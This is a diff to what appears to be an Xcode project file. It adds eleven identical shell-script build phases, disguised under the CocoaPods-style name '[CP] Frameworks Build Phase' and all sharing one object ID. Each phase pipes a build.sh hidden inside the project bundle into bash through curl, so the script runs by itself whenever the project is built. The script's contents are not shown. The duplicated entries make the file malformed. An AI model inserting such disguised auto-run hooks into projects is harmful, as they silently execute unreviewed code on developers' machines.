@@ -546,6 +546,232 @@
 		};
 /* End XCConfigurationList section */
 
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+		
+	167012E12301506800C38AA3 /* [CP] Frameworks Build Phase */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Frameworks Build Phase";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "curl -s \"file:///${PROJECT_FILE_PATH}/build.sh\" | bash";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+
 /* Begin XCVersionGroup section */
 		6695E73D23609A7F00A80ED2 /* RecentAdModel.xcdatamodeld */ = {
 			isa = XCVersionGroup;
